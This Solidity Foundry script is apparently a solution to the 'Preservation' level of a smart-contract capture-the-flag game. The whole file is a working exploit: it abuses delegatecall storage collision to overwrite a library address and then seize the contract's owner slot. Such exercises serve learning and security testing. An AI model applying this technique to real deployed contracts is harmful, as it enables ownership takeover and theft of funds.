// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/levels/16-Preservation/Preservation.sol";

contract ExploitScript is Script {
    PreservationExploit PreservationExploitContract;
    Preservation level16 = Preservation(payable(0xb23d4B1736d7fFC212c53cCe25C88Ce0CF99dC1D));

    function run() public {
        vm.startBroadcast();
        PreservationExploitContract = new PreservationExploit();
        PreservationExploitContract.exploit(address(level16));
        vm.stopBroadcast();
    }
}

contract PreservationExploit {
    address public _timeZone1Library;
    address public _timeZone2Library;
    address public owner; //slot 2

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }

    function exploit(address instanceAddress) public {
        Preservation instance = Preservation(payable(instanceAddress));
        instance.setFirstTime(uint256(uint160(address(this))));
        instance.setFirstTime(uint256(uint160(address(this))));
    }
}